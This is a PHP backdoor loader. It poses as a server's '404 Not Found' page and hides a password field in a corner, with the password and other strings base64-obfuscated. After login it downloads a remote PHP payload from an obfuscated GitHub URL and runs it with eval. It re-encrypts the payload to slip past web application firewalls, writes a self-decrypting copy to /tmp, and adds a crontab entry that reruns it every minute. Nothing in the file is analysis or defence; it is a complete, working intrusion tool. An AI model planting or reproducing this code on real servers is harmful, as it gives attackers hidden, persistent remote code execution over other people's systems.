<?php
error_reporting(0); // Hide errors

// 🔹 Auto-Detect System
function get_server_info() {
    if (stristr(PHP_OS, 'WIN')) {
        return base64_decode("QXBhY2hlLzIuNC40MSAoV2luMzIpIFBIUC8=") . PHP_VERSION;
    } elseif (stristr(PHP_OS, 'Linux')) {
        return base64_decode("QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBQSFAv") . PHP_VERSION;
    } elseif (stristr($_SERVER["SERVER_SOFTWARE"], "nginx")) {
        return base64_decode("bmdpbngvMS4xOC4wIChVYnVudHUp");
    } else {
        return $_SERVER["SERVER_SOFTWARE"] . base64_decode("IFBIUC8=") . PHP_VERSION;
    }
}

// 🔹 Logout System
if (isset($_GET['logout'])) {
    setcookie("access", "", time() - 3600, "/");
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// 🔹 Hidden Login System (404 Page)
$password = base64_decode("R3JlZ0N5YmVyNDA0");
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["key"]) && $_POST["key"] === $password) {
        setcookie("access", md5($password), time() + 3600, "/");
        header("Refresh:0");
        exit;
    }
}
if (!isset($_COOKIE["access"]) || $_COOKIE["access"] !== md5($password)) {
    header(base64_decode("SFRUUC8xLjAgNDA0IE5vdCBGb3VuZA=="));
    echo base64_decode("PCFET0NUWVBFIGh0bWw+CiA8aHRtbD4KICA8aGVhZD4KICAgIDx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgdGV4dC1hbGlnbjogY2VudGVyOyBwYWRkaW5nOiA1MHB4OyB9CiAgICAgIGgxIHsgZm9udC1zaXplOiAyMnB4OyBjb2xvcjogIzMzMzt9CiAgICAgIHAgeyBjb2xvcjogIzY2NjsxNiB9CiAgICAgIC5jb250YWluZXIgeyBtYXgtd2lkdGg6IDYwMHB4OyBtYXJnaW46IGF1dG87IH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPGRpdiBjbGFzcz0nY29udGFpbmVyJz4KICAgICAgPGgxPjQwNCBOb3QgRm91bmQ8L2gxPgogICAgICA8cD5UaGUgcmVxdWVzdGVkIFVSTCB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvcD4KICAgICAgPGhyPgogICAgICA8cD4=") . get_server_info() . base64_decode("IFNlcnZlciBhdCA=") . $_SERVER['SERVER_NAME'] . base64_decode("IFBvcnQg") . $_SERVER['SERVER_PORT'] . base64_decode("PC9wPgo8L2Rpdj4=");

    echo "<form method='POST'>
            <input type='password' name='key' autocomplete='off' style='position:absolute;bottom:5px;left:5px;width:50px;height:20px;border:none;background:transparent;'>
          </form>
        </body>
    </html>";
    exit;
}

// 🔹 Fetch Payload & Execute
function get_payload($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hZEV4cGxvaXRzL0dlY2tvL3JlZnMvaGVhZHMvbWFpbi9nZWNrby1uZXcucGhw"));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, base64_decode("TW96aWxsYS81LjA="));
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$payload = get_payload($url);

if ($payload) {
    // 🔹 AES Encryption (Bypass WAF)
    $key = base64_decode("R3JlZ0N5YmVyQDQ5MjAxMA==");
    $iv = base64_decode("MTIzNDU2Nzg5MDEyMzQ1Ng=="); 
    $encrypted = base64_encode(openssl_encrypt($payload, "AES-256-CBC", $key, 0, $iv));

    // 🔹 Anti-Delete (Auto-Recreate)
    $backup_path = base64_decode("L3RtcC8uYmFja3VwLnBocA==");
    file_put_contents($backup_path, '<?php $decrypted = openssl_decrypt(base64_decode("' . $encrypted . '"), "AES-256-CBC", "' . $key . '", 0, "' . $iv . '"); eval("?>".$decrypted); ?>');
    shell_exec('echo "* * * * * php ' . $backup_path . '" | crontab -');

    // 🔹 Execute Payload (Memory Execution)
    eval("?>".$payload);
} else {
    echo base64_decode("4oCmIEZhaWxlZCB0byBmZXRjaCBwYXlsb2FkLg==");
}
?>
